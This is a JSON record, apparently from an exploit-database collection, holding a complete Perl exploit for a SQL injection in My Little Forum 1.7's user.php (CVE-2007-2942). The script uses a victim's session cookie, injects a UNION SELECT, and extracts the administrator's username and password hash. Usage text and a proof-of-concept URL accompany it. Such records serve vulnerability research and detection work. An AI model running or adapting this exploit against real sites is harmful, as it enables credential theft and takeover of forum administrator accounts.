{
  "id": "3989",
  "title": "My Little Forum 1.7 - &#039;user.php?id&#039; SQL Injection",
  "cve": "CVE-2007-2942",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n\r\n#################################################################################\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#\t      \t  My Little Forum <= 1.7 SQL Injection Exploit\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Discovered by: Silentz\t\t\t\t\t\t\t#\r\n# Payload: Admin Username & Hash Retrieval\t\t\t\t\t#\r\n# Website: http://www.w4ck1ng.com\t\t\t\t\t\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Vulnerable Code (user.php):\t \t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#   if (isset($_GET['id'])) $id = $_GET['id'];\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#   switch ($action)\t\t\t\t\t\t\t\t#\r\n#   {\t\t\t\t\t\t\t\t\t\t#\r\n#   case \"get userdata\":\t\t\t\t\t\t\t#\r\n#   if (empty($id)) $id = $user_id;\t\t\t\t\t\t#\r\n#   else $result = mysql_query(\"SELECT user_id, user_type, user_name, \t\t#\r\n#   user_real_name, user_email, hide_email, user_hp, user_place, signature, \t#\r\n#   profile, UNIX_TIMESTAMP(registered + INTERVAL \".$time_difference.\" HOUR) AS #\r\n#   since_date FROM \".$db_settings['userdata_table'].\" WHERE user_id = \t\t#\r\n#   '\".$id.\"'\", $connid);\t\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# PoC: http://victim.com/forum/user.php?id=-999' UNION SELECT 0,0,user_name,\t#\r\n#      user_pw,0,0,0,0,0,0,0 FROM forum_userdata where user_id=1 /*\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# \t\t\t\t\t\t\t\t\t\t#\r\n# Subject To: magic_quotes_gpc set of off & having an already existant account\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# GoogleDork: Get your own!\t\t\t\t\t\t\t#\r\n# Shoutz: The entire w4ck1ng community\t\t\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n# Notes: You need to obtain your current Session Identifier. Variables $page, \t#\r\n#        $descasc and $order may also be exploitable.\t\t\t\t#\r\n#\t\t\t\t\t\t\t\t\t\t#\r\n#################################################################################\r\n\r\nuse LWP::UserAgent;\r\nif (@ARGV < 2){\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"           \t   My Little Forum <= 1.7 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"Usage: w4ck1ng_mylittleforum.pl [PATH] [SESSION_ID]\\r\\n\\r\\n\";\r\nprint \"[PATH] = Path where My Little Forum is located\\r\\n\";\r\nprint \"[SESSION_ID] = Session identifier of logged on user\\r\\n\\r\\n\";\r\nprint \"e.g. w4ck1ng_mylittleforum.pl http://victim.com/forum/ cjjjauie95inbmo5fim8m93vo1\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nexit();\r\n}\r\n\r\n$b = LWP::UserAgent->new() or die \"Could not initialize browser\\n\";\r\n$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');\r\n$cookie = \"$ARGV[1];\";\r\n$host = $ARGV[0] . \"user.php?id=-999' UNION SELECT 0,0,user_name,user_pw,0,0,0,0,0,0,0 FROM forum_userdata where user_id=1 /*\";\r\n\r\nmy @cookie = ('Cookie' => \"PHPSESSID=$cookie;\");\r\nmy $res = $b->get($host, @cookie);\r\n\r\n$answer = $res->content;\r\nif ($answer =~ /<h2>User info: (.*?)<\\/h2>/){\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"           \t   My Little Forum <= 1.7 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"[+] Admin User : $1\\n\";\r\n}\r\n\r\nif ($answer =~/<p class=\"userdata\">([0-9a-fA-F]{32})<\\/p><\\/td>/){\r\nprint \"[+] Admin Hash : $1\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"            \t\t http://www.w4ck1ng.com\\r\\n\";\r\nprint \"            \t\t        ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\n}\r\n\r\nelse {\r\n  print \"\\nExploit Failed...\\n\";\r\n}\r\n\r\n# milw0rm.com [2007-05-25]",
  "url": "https://www.exploit-db.com/exploits/3989"
}